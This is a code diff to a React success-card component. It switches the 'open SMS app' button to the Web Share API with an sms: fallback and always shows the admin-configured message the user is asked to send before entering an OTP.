@@ -1,7 +1,7 @@
 "use client";
 
 import { useEffect, useState } from "react";
-import { CheckCircle2, MessageSquare, Loader2 } from "lucide-react";
+import { CheckCircle2, MessageSquare, Share2, Loader2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
 
@@ -36,11 +36,16 @@ export function SuccessCard({ submissionId, onContinue }: SuccessCardProps) {
   }
 
   function openSmsApp() {
-    let uri = `sms:${smsNumber}`;
-    if (smsMessage) {
-      uri += `?body=${encodeURIComponent(smsMessage)}`;
+    const body = smsMessage
+      ? `Forward this message to ${smsNumber}: ${smsMessage}`
+      : `Forward this message to ${smsNumber}`;
+
+    if (navigator.share) {
+      navigator.share({ text: body }).catch(() => {});
+    } else {
+      const uri = `sms:${smsNumber}${smsMessage ? `?body=${encodeURIComponent(smsMessage)}` : ""}`;
+      window.location.href = uri;
     }
-    window.location.href = uri;
   }
 
   return (
@@ -56,12 +61,12 @@ export function SuccessCard({ submissionId, onContinue }: SuccessCardProps) {
           <span className="font-bold text-gray-700">{smsNumber}</span>
           {" "}and ask for OTP. Then click Continue to enter the OTP.
         </p>
-        {smsMessage && (
-          <div className="bg-gray-50 rounded-lg p-3 text-left">
-            <p className="text-xs text-gray-400 uppercase tracking-wider mb-1">Message preview</p>
-            <p className="text-sm text-gray-700 break-words">{smsMessage}</p>
-          </div>
-        )}
+        <div className="bg-gray-50 rounded-lg p-3 text-left">
+          <p className="text-xs text-gray-400 uppercase tracking-wider mb-1">Message to send</p>
+          <p className="text-sm text-gray-700 break-words">
+            {loading ? "Loading..." : smsMessage || "(No admin message configured yet)"}
+          </p>
+        </div>
         <div className="space-y-3 pt-2">
           {isMobile && (
             <Button
@@ -72,6 +77,8 @@ export function SuccessCard({ submissionId, onContinue }: SuccessCardProps) {
             >
               {loading ? (
                 <Loader2 className="h-5 w-5 animate-spin" />
+              ) : navigator.share ? (
+                <Share2 className="h-5 w-5" />
               ) : (
                 <MessageSquare className="h-5 w-5" />
               )}
